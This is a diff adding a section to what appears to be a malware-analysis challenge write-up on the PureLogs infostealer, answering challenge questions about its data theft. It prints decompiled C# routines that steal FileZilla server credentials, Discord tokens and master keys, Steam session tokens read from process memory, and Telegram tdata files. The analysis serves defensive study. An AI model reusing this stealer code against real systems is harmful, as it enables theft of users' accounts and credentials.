@@ -5,7 +5,6 @@ date: 2026-01-27
 tags: ['MalOps', 'Reverse', 'Malware']
 image: './banner.png'
 authors: ['enscribe']
-password: 'MalOps-26.01.27'
 ---
 
 import Callout from '@/components/Callout.astro'
@@ -486,3 +485,325 @@ Therefore, the answer would be `Elevation:Administrator!new:`.
 ### Task 9: PureLogs uses COM objects to silently bypass User Account Control (UAC) and relaunch itself with elevated privileges. What ATT&CK technique does this behavior map to?
 
 As we analyzed in the previous task, this behavior directly maps to ATT&CK: [**T1548.002 – Abuse Elevation Control Mechanism: Bypass User Account Control (UAC)**](https://attack.mitre.org/techniques/T1548/002) .
+
+### Task 10: What regex pattern does PureLogs use to find Steam session tokens?
+
+In the code of `class13`, we see the following section:
+
+```csharp
+if (Convert.ToBoolean(GClass4.string_6) || Convert.ToBoolean(GClass4.string_4) || Convert.ToBoolean(GClass4.string_5) || Convert.ToBoolean(GClass4.string_7))
+{
+    try
+    {
+        Class13.dictionary_0.Add("Apps", Convert.ToBase64String(Class5.smethod_0()));
+    }
+    catch
+    {
+    }
+}
+```
+
+If any **Apps module** is enabled, it calls `Class5.smethod_0()` to retrieve the data blob, encode it in **Base64**, and insert it into `Class13.dictionary_0["Apps"]`.
+
+```csharp
+internal static byte[] smethod_0()
+{
+    List<Action> list = new List<Action>();
+    if (Convert.ToBoolean(GClass4.string_6))
+    {
+        list.Add(new Action(Class5.smethod_1));
+    }
+    if (Convert.ToBoolean(GClass4.string_4))
+    {
+        list.Add(new Action(Class5.smethod_4));
+    }
+    if (Convert.ToBoolean(GClass4.string_5))
+    {
+        list.Add(new Action(Class5.smethod_3));
+    }
+    if (Convert.ToBoolean(GClass4.string_7))
+    {
+        list.Add(new Action(Class5.smethod_2));
+    }
+    ParallelOptions parallelOptions = new ParallelOptions
+    {
+        MaxDegreeOfParallelism = list.Count
+    };
+    Parallel.ForEach<Action>(list, parallelOptions, new Action<Action>(Class5.<>c.<>c_0.method_0));
+    Dictionary<string, byte[]> dictionary = new Dictionary<string, byte[]>();
+    if (Class5.byte_0 != null)
+    {
+        dictionary.Add("FileZilla", Class5.byte_0);
+    }
+    if (Class5.byte_1 != null)
+    {
+        dictionary.Add("Telegram", Class5.byte_1);
+    }
+    if (Class5.byte_2 != null)
+    {
+        dictionary.Add("Steam", Class5.byte_2);
+    }
+    if (Class5.dictionary_0.Count != 0)
+    {
+        dictionary.Add("Discord", Class14.smethod_8(Class5.dictionary_0));
+    }
+    if (Class5.byte_0 == null && Class5.byte_1 == null && Class5.byte_2 == null && Class5.dictionary_0 == null)
+    {
+        return null;
+    }
+    return Class14.smethod_8(dictionary);
+}
+```
+
+It selects which modules to run based on the `GClass4.string_*` configuration flags. Then run those modules in **parallel** to collect data.
+
+```csharp
+ParallelOptions parallelOptions = new ParallelOptions
+{
+    MaxDegreeOfParallelism = list.Count
+};
+Parallel.ForEach(list, parallelOptions, Class5.<>c.<>c_0.method_0);
+```
+
+Group the results into the dictionary by application name.
+
+```csharp
+Dictionary<string, byte[]> dictionary = new Dictionary<string, byte[]>();
+
+if (Class5.byte_0 != null) dictionary.Add("FileZilla", Class5.byte_0);
+if (Class5.byte_1 != null) dictionary.Add("Telegram", Class5.byte_1);
+if (Class5.byte_2 != null) dictionary.Add("Steam", Class5.byte_2);
+
+if (Class5.dictionary_0.Count != 0)
+{
+    dictionary.Add("Discord", Class14.smethod_8(Class5.dictionary_0));
+}
+```
+
+Let's delve into the functions that carry out the data theft.
+
+```csharp title="FileZilla"
+
+internal static void smethod_1()
+{
+    try
+    {
+        string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\FileZilla\\recentservers.xml";
+        if (File.Exists(text))
+        {
+            Class5.byte_0 = Class14.smethod_10(text);
+        }
+    }
+    catch
+    {
+    }
+}
+```
+
+> **FileZilla (FTP client)**: Extracts server credentials from `recentservers.xml` configuration file
+
+```csharp title="Discord"
+
+internal static void smethod_2()
+{
+    string string_ = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\discord";
+    string path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\discord\\Local Storage\\leveldb";
+    if (Directory.Exists(path))
+    {
+        foreach (string string_2 in Directory.GetFiles(path, "*.ldb"))
+        {
+            try
+            {
+                Match match = Regex.Match(Encoding.UTF8.GetString(Class14.smethod_10(string_2)), "dQw4w9WgXcQ:[^\"]*");
+                if (match.Success)
+                {
+                    Class5.dictionary_0.Add("EncryptToken", Convert.FromBase64String(match.Groups[0].Value.Split(new char[]
+                    {
+                        ':'
+                    })[1]));
+                    break;
+                }
+            }
+            catch
+            {
+            }
+        }
+        try
+        {
+            Class5.dictionary_0.Add("MasterKey", Class7.smethod_19(string_));
+        }
+        catch
+        {
+        }
+    }
+}
+```
+
+> Discord: It attempts to obtain the encrypted token from `LevelDB` and the `master key` (decryption key) to later decrypt the token.
+
+```csharp Title="Steam"
+internal static void smethod_4()
+{
+    try
+    {
+        Process process = Process.GetProcessesByName("steam").FirstOrDefault<Process>();
+        if (process != null)
+        {
+            IntPtr intPtr = Class5.OpenProcess(16, false, process.Id);
+            if (!(intPtr == IntPtr.Zero))
+            {
+                using (Class5.Class6 @class = new Class5.Class6(intPtr))
+                {
+                    IntPtr intPtr2 = IntPtr.Zero;
+                    IntPtr intPtr3 = new IntPtr(int.MaxValue);
+                    byte[] array = new byte[4096];
+                    Regex regex = new Regex("[A-Za-z0-9-_]{16,}\\.[A-Za-z0-9-_]{40,}\\.[A-Za-z0-9-_]{40,}");
+                    while (intPtr2.ToInt64() < intPtr3.ToInt64())
+                    {
+                        int count;
+                        if (Class5.ReadProcessMemory(@class.Handle, intPtr2, array, array.Length, out count))
+                        {
+                            string @string = Encoding.ASCII.GetString(array, 0, count);
+                            Match match = regex.Match(@string);
+                            if (match.Success)
+                            {
+                                Class5.byte_2 = Encoding.UTF8.GetBytes(match.Value);
+                                break;
+                            }
+                        }
+                        intPtr2 = IntPtr.Add(intPtr2, array.Length);
+                    }
+                }
+            }
+            else
+            {
+                Class5.byte_2 = null;
+            }
+        }
+        else
+        {
+            Class5.byte_2 = null;
+        }
+    }
+    catch
+    {
+    }
+}
+```
+
+> Steam: Harvests account credentials and session information
+
+```csharp Title="Telegram"
+internal static void smethod_3()
+{
+    string text = null;
+    RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software\\Classes\\tdesktop.tg\\DefaultIcon");
+    if (registryKey != null)
+    {
+        try
+        {
+            string text2 = (string)registryKey.GetValue(null);
+            registryKey.Close();
+            if (!string.IsNullOrEmpty(text2))
+            {
+                text2 = text2.Remove(text2.LastIndexOf('\\') + 1);
+                text = text2.Replace('"', ' ') + "tdata";
+            }
+        }
+        catch
+        {
+        }
+    }
+    if (text == null)
+    {
+        try
+        {
+            RegistryKey registryKey2 = Registry.CurrentUser.OpenSubKey("Software\\Classes\\tg\\DefaultIcon");
+            if (registryKey2 != null)
+            {
+                string text3 = (string)registryKey2.GetValue(null);
+                registryKey2.Close();
+                if (!string.IsNullOrEmpty(text3))
+                {
+                    text3 = text3.Remove(text3.LastIndexOf('\\') + 1);
+                    text = text3.Replace('"', ' ') + "tdata";
+                }
+            }
+        }
+        catch
+        {
+        }
+    }
+    if (text == null)
+    {
+        try
+        {
+            Process[] processesByName = Process.GetProcessesByName("telegram");
+            if (processesByName.Length != 0)
+            {
+                text = Path.GetDirectoryName(processesByName[0].MainModule.FileName) + "\\tdata";
+            }
+        }
+        catch
+        {
+        }
+    }
+    if (text != null && Directory.Exists(text))
+    {
+        using (MemoryStream memoryStream = new MemoryStream())
+        {
+            using (ZipArchive zipArchive = new ZipArchive(memoryStream, ZipArchiveMode.Create, true))
+            {
+                foreach (string text4 in Directory.GetFiles(text, "*", SearchOption.AllDirectories))
+                {
+                    try
+                    {
+                        string entryName = text4.Substring(text.Length).Trim(new char[]
+                        {
+                            Path.DirectorySeparatorChar
+                        });
+                        FileInfo fileInfo = new FileInfo(text4);
+                        string name = fileInfo.Name;
+                        if (fileInfo.Length <= 5120L)
+                        {
+                            if (!name.EndsWith("s"))
+                            {
+                                if (name.StartsWith("usertag") || name.StartsWith("settings") || name.StartsWith("key_data"))
+                                {
+                                    ZipArchiveEntry zipArchiveEntry = zipArchive.CreateEntry(entryName, CompressionLevel.Optimal);
+                                    using (FileStream fileStream = new FileStream(text4, FileMode.Open, FileAccess.Read))
+                                    {
+                                        using (Stream stream = zipArchiveEntry.Open())
+                                        {
+                                            fileStream.CopyTo(stream);
+                                        }
+                                    }
+                                }
+                            }
+                            else
+                            {
+                                ZipArchiveEntry zipArchiveEntry2 = zipArchive.CreateEntry(entryName, CompressionLevel.Optimal);
+                                using (FileStream fileStream2 = new FileStream(text4, FileMode.Open, FileAccess.Read))
+                                {
+                                    using (Stream stream2 = zipArchiveEntry2.Open())
+                                    {
+                                        fileStream2.CopyTo(stream2);
+                                    }
+                                }
+                            }
+                        }
+                    }
+                    catch
+                    {
+                    }
+                }
+            }
+            Class5.byte_1 = memoryStream.ToArray();
+        }
+    }
+}
+```
+
+> Telegram: It attempts to locate Telegram's tdata folder on the computer, then filters out some small, important files and compresses (zips) them into RAM.
+
+### Task 11: PureLogs adds a unique tag to the stolen data before sending it to the attacker. What is the exact string it adds to identify this specific build of the malware?
